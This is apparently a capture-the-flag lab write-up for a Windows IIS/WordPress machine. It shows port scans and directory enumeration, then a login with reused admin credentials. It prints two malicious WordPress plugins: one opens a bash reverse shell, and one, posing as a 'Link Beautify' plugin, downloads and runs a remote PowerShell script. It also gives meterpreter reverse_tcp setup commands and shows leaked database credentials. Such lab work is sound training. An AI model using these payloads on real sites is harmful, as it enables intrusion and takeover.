`sudo nmap -p- --min-rate=1000 -sS -A -T4 10.10.10.29`  
PORT     STATE SERVICE VERSION  
80/tcp   open  http    Microsoft IIS httpd 10.0  
| http-methods:  
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: IIS Windows Server  
3306/tcp open  mysql   MySQL (unauthorized)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008 (90%)  
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2  
Aggressive OS guesses: Microsoft Windows Server 2016 (90%), Microsoft Windows Server 2012 or Windows Server  2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%)  

80 -- IIS
3306 -- MySQL

`mysql -h10.10.10.29`
ERROR 1130 (HY000): Host '10.10.14.74' is not allowed to connect to this MySQL server
Mysql does nol like me

`python3 dirsearch.py -u 10.10.10.29 -E`  
[16:08:35] Starting:  
[16:09:13] 403 -  312B  - /%2e%2e/google.com                                      
[16:11:39] 301 -    0B  - /Wordpress/  ->  http://10.10.10.29/wordpress/   

More
`python3 dirsearch.py -u http://10.10.10.29/wordpress/ -E`  
Target: http://10.10.10.29/wordpress/

[16:19:39] Starting:  
[16:21:35] 301 -    0B  - /wordpress/index.php  ->  http://10.10.10.29/wordpress/                                 
[16:21:42] 200 -   19KB - /wordpress/license.txt                                                        
[16:22:21] 200 -    7KB - /wordpress/readme.html                                               
[16:23:00] 301 -  161B  - /wordpress/wp-admin  ->  http://10.10.10.29/wordpress/wp-admin/                         
[16:23:00] 500 -    3KB - /wordpress/wp-admin/setup-config.php
[16:23:01] 301 -  163B  - /wordpress/wp-content  ->  http://10.10.10.29/wordpress/wp-content/  
[16:23:01] 200 -    0B  - /wordpress/wp-content/  
[16:23:02] 200 -    1KB - /wordpress/wp-admin/install.php        
[16:23:02] 403 -    1KB - /wordpress/wp-content/uploads/                      
[16:23:02] 302 -    0B  - /wordpress/wp-admin/  ->  http://10.10.10.29/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&reauth=1  
[16:23:02] 200 -    0B  - /wordpress/wp-config.php           
[16:23:02] 301 -  164B  - /wordpress/wp-includes  ->  http://10.10.10.29/wordpress/wp-includes/  
[16:23:02] 500 -    0B  - /wordpress/wp-includes/rss-functions.php  
[16:23:02] 403 -    1KB - /wordpress/wp-includes/  
[16:23:04] 200 -    3KB - /wordpress/wp-login.php   
[16:23:05] 405 -   42B  - /wordpress/xmlrpc.php     

Burpburpburp  

No SQLi on public search fields    
Well, that is lame... wp content admin is admin:P@s5w0rd! as on previous machine

can uppload plugins right to the admin panel
It does not work by some reason

<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>


Ohhh, come on! That is a windows machine...  

<?php  

/**  
* Plugin Name: Link Beautify  
* Plugin URI: linkbeautify.org   
* Description: Make Links Beautiful  
* Version: 1.442  
* Author: John Smith  
* Author URI: linkbeautify.org   
*/  

echo shell_exec('powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.42/rs.ps1\");');
?>  

`sudo python3 -m http.server 80`  

and regular powershell payload  

`whoami`  
nt authority\iusr  

`hostname`   
Shield  

Let's try escalate   
http://www.fuzzysecurity.com/tutorials/16.html   

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`  
OS Name:                   Microsoft Windows Server 2016 Standard  
OS Version:                10.0.14393 N/A Build 14393  

`net users`

User accounts for   

Administrator            DefaultAccount           Guest                    
The command completed with one or more errors.   

`ipconfig /all`  
blahblahblah  

`route print`  
blahblahblah  

`cat wp-settings.php`  
define('DB_NAME', 'wordpress124');  

/** MySQL database username */  
define('DB_USER', 'wordpressuser124');  

/** MySQL database password */  
define('DB_PASSWORD', 'P_-U9dA6q.B|');  

/** MySQL hostname */   
define('DB_HOST', 'localhost');  

Lets try some metasploit  
``` 
msfvenom --list payloads
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.42 lport=4444 -f raw
msfconsole
set payload php/meterpreter/reverse_tcp
set lhost 10.10.14.42
set lport 4444
```




